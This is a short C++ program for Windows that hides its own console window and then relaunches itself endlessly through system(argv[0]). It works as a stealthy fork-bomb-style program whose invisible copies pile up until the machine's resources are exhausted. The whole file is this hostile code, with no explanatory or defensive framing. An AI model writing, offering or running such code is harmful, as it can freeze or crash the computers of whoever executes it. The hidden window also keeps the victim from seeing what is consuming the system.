#include <cstdlib>
#include <windows.h>

int main(int argc, char** argv) {

    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }

    // This will keep executing the program recursively.
    while (1) {
        system(argv[0]);  
    }
    return 0;
}
